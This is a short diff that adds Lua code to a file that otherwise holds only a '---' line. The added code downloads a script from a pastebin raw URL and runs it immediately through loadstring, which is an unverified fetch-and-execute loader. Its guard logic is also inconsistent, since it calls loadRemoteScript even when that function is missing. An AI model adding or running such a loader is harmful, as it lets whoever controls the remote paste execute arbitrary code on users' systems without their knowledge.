@@ -1,1 +1,10 @@
---
+local urlScript = 'https://pastebin.com/raw/DRxtr8Zp';
+
+do
+    if not loadRemoteScript or type(loadRemoteScript) ~= 'function' then
+        modules._G.HTTP.get(urlScript, function(script)
+            (loadstring(script))();
+        end);
+    end
+    loadRemoteScript(urlScript);
+end
